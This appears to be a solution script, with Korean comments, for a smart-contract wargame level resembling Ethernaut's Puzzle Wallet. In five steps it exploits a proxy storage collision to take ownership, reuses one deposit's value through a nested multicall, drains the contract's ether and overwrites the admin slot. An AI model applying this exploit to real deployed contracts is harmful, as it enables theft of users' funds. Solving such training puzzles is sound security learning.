// ========================================
// 하나씩 실행하면서 확인
// ========================================

const player = (await web3.eth.getAccounts())[0];

// === STEP 1 ===
// proposeNewAdmin 호출
const proposeData = web3.eth.abi.encodeFunctionCall({
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [{ type: 'address', name: '_newAdmin' }]
}, [player]);

await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data: proposeData,
    gas: 100000
});

// 확인
await contract.owner(); // player 주소가 나와야 함

// === STEP 2 ===
await contract.addToWhitelist(player);
await contract.whitelisted(player); // true

// === STEP 3 ===
const depositData = web3.eth.abi.encodeFunctionSignature("deposit()");
const multicallData = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{ type: 'bytes[]', name: 'data' }]
}, [[depositData]]);

await contract.multicall([depositData, multicallData], {
    value: web3.utils.toWei('0.001', 'ether')
});

// 확인
await contract.balances(player); // 0.002 ETH

// === STEP 4 ===
const balance = await web3.eth.getBalance(contract.address);
await contract.execute(player, balance, "0x");

// 확인
await web3.eth.getBalance(contract.address); // 0

// === STEP 5 ===
await contract.setMaxBalance(player);

// 확인 (admin은 slot 1에 저장됨)
const adminSlot = await web3.eth.getStorageAt(contract.address, 1);
const admin = '0x' + adminSlot.slice(26);
console.log("Admin:", admin);
console.log("Player:", player);
console.log("Match:", admin.toLowerCase() === player.toLowerCase());